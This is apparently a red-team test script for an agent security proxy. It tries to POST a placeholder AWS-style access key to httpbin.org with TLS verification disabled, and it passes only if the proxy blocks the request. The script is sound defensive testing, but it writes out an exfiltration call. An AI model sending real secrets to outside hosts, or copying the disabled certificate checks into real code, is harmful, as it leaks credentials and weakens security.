import sys
import os
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', 'sdk', 'python')))
from gateway import ATPClient

print("--- Red-Team Test: Exfiltration Patterns ---")
ATPClient.infiltrate(agent_id="bot-omega")

print("\nAttempting to exfiltrate secret-shaped string (e.g. AWS Key format)...")

try:
    response = requests.post(
        "https://httpbin.org/post",
        json={"data": "AKIAIOSFODNN7EXAMPLE", "amount": 10.0},
        timeout=10,
        verify=False
    )
    if response.status_code == 200:
        print("FAILURE: Secret exfiltration bypassed the proxy!")
        sys.exit(1)
    else:
        print(f"SUCCESS: Request BLOCKED by Proxy. Status: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Request Failed: {e}")
